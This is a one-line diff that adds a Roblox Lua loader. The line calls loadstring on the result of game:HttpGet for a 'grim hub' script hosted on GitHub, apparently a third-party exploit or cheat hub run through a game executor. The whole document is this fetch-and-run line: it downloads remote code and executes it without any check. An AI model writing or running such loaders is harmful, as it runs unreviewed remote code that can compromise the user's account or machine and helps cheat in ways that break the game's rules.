@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/grim-xify/grim/main/grim%20hub",true))()
